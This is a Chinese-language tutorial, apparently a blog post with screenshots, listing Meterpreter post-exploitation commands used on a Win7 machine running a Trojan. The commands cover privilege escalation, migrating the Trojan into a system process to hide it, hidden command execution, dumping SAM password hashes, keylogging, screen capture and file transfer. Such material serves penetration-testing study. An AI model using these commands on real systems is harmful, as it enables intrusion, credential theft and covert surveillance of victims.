## **meterpreter基本命令**

1.getuid 查看当前用户

[![wps43](https://image.3001.net/images/20201116/1605503774.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105453883-1283415529.jpg)

2.getpid 查看当前的进程id

[![wps44](https://image.3001.net/images/20201116/1605503775.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105454460-983201389.jpg)

3.getsystem 初步提权

[![wps45](https://image.3001.net/images/20201116/1605503776.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105454998-935186991.jpg)

注意：这边是在win7使用管理员身份运行木马了，不然一般是不成功的。

4.ps 1.查看进程列表2.帮助我们获取pid进行进程迁移

[![wps46](https://image.3001.net/images/20201116/1605503776.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105455650-1839772238.jpg)

5.migrate 7624 迁移 将木马进程注入系统进程中

[![wps47](https://image.3001.net/images/20201116/1605503777.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105456280-1302779205.jpg)

这时候在输入ps查看就找不到4092进程了

6.shell 进入cmd环境（碰到乱码：chcp 65001 （utf-8））

[![wps48](https://image.3001.net/images/20201116/1605503778.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105457023-1841459506.jpg)

7.execute 执行命令（常用execute -H -c -i -f cmd）

[![wps49](https://image.3001.net/images/20201116/1605503779.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105457787-1385037009.jpg)

-H创建隐藏的进程

-c 信道化I/O(交互所需)

-i 创建流程后与之交互

-f 要运行的可执行命令

8.bg 返回控制台

[![wps50](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105458464-1897530367.jpg)

9.sessions 查看会话

[![wps51](https://image.3001.net/images/20201116/1605503780.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105459009-1995736701.jpg)

10.sessions -i id 进入会话

[![wps52](https://image.3001.net/images/20201116/1605503780.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105459602-347569723.jpg)

11.sessions -k id | sessions -K 指定删除会话|删除全部会话

[![wps53](https://image.3001.net/images/20201116/1605503781.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105500202-753964713.jpg)

[![wps54](https://image.3001.net/images/20201116/1605503782.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105500820-1341150872.jpg)

12.jobs 查看工作

[![wps55](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105501682-912499341.jpg)

13.run -j | exploit -j 后台监听

[![wps56](https://image.3001.net/images/20201116/1605503783.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105503256-504844102.jpg)

win7点击木马文件后会话才会产生

[![wps57](https://image.3001.net/images/20201116/1605503784.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105504856-841686656.jpg)

14.run -z | exploit -z 持续监听

[![wps58](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105505469-825245122.jpg)

[![wps59](https://image.3001.net/images/20201116/1605503785.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105506640-1871907375.jpg)

15.hashdump 下载sam表中的账户密码信息（需要管理员权限）

[![wps60](https://image.3001.net/images/20201116/1605503785.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105507301-1896824232.jpg)

16.捕获键盘按击

keyscan_dump Dump the keystroke buffer

keyscan_start Start capturing keystrokes

keyscan_stop Stop capturing keystrokes

[![wps61](https://image.3001.net/images/20201116/1605503786.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105507922-2078449117.jpg)

17screenshot 截屏

[![wps62](https://image.3001.net/images/20201116/1605503787.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105508627-1371969567.jpg)

[![wps63](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105509204-156605414.jpg)

18.run vnc | screenshare 实时查看对方电脑屏幕

[![wps64](https://image.3001.net/images/20201116/1605503788.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105509834-1026023314.jpg)[![wps65](https://image.3001.net/images/20201116/1605503788.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105510822-1453161013.jpg)

19.pwd 当前目录位置

[![wps66](https://image.3001.net/images/20201116/1605503789.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105512112-1681435646.jpg)

20.download 从远程主机中下载文件

[![wps67](https://image.3001.net/images/20201116/1605503790.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105513385-1496367140.jpg)[![wps68](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105514652-1188155067.jpg)[![wps69](https://image.3001.net/images/20201116/1605503791.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105515262-387302396.jpg)

21.upload 从远程主机中上传文件

[![wps70](https://image.3001.net/images/20201116/1605503792.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105515875-693882757.jpg)

[![wps71](https://image.3001.net/images/20201116/1605503792.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105516474-606487337.jpg)[![wps72](https://image.3001.net/images/20201116/1605503793.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111105517168-636548723.jpg)

